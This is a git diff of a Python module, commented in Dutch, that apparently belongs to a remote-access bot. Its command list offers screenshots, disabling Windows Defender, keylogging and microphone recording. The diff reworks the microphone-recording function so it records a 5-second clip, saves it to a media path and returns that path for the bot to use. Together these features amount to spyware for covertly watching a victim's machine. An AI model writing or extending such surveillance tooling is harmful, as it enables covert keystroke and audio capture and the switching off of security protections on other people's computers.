@@ -1,5 +1,5 @@
 # Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
-import cv2, os, time, subprocess, sys, ctypes, winreg, re
+import cv2, os, time, subprocess, sys, ctypes, winreg, re, sounddevice, wavio
 from PIL import ImageGrab
 from pynput import keyboard
 
@@ -58,7 +58,7 @@ Command Lijst:
 /ss             -   Maak een screenshot van het scherm
 /stopdefender   -   Windows Defender uitgeschakelen
 /keylog         -   luister naar keyboard toetsen totdat de gebruiker enter klikt
-/listen         -   maak een geluidsopname
+/listen         -   maak een 5 seconde geluidsopname
 """
 
 # path en naam voor het opslaan van media
@@ -215,36 +215,8 @@ def key_log():
     # return een list zonder aanhalings tekens
     return send_string
 
-# import pyaudio
-# def get_audioFile():
-#     audio = pyaudio.PyAudio()
-#     stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
 
-#     frames = []
-
-#     try:
-#         while True:
-#             data = stream.read(1024)
-#             frames.append(data)
-#     except KeyboardInterrupt:
-#         pass
-
-#     stream.stop_stream()
-#     stream.close()
-#     audio.terminate()
-
-#     sound_file = wave.open("myrecording.wav", "wb")
-#     sound_file.setnchannels(1)
-#     sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
-#     sound_file.setframerate(44100)
-#     sound_file.write_frames(b''.join(frames))
-#     sound_file.close()
-
-# import required libraries
-import sounddevice as sd
-from scipy.io.wavfile import write
-import wavio as wv
-
+# https://www.geeksforgeeks.org/python/create-a-voice-recorder-using-python/
 def get_audioFile():
     # Sampling frequency
     freq = 44100
@@ -254,16 +226,14 @@ def get_audioFile():
 
     # Start recorder with the given values 
     # of duration and sample frequency
-    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
+    recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
 
     # Record audio for the given number of seconds
-    sd.wait()
+    sounddevice.wait()
 
-    # This will convert the NumPy array to an audio
-    # file with the given sampling frequency
-    write("recording0.wav", freq, recording)
+    audioPath = save_media_to("audio", "wav")
 
     # Convert the NumPy array to audio file
-    wv.write("recording1.wav", recording, freq, sampwidth=2)
+    wavio.write(audioPath, recording, freq, sampwidth=2)
 
-get_audioFile()
+    return audioPath
